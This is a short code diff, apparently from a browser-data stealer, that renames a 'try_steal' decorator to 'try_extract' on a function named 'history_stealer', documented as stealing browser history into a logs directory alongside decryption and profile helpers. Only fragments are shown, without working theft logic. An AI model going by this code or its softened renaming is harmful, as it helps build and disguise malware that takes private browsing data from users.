@@ -1,7 +1,7 @@
 """ IMPORTS """
 import json
 import sqlite3
-from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt
+from util import try_extract, get_profiles, create_temp_file, log_data, try_decrypt
 
 
 """
@@ -14,7 +14,7 @@ Tables of interest from SQLi Recon:
 """
 
 
-@try_steal
+@try_extract
 def history_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals browser history and places them into the logs directory """
     # Examine each profile
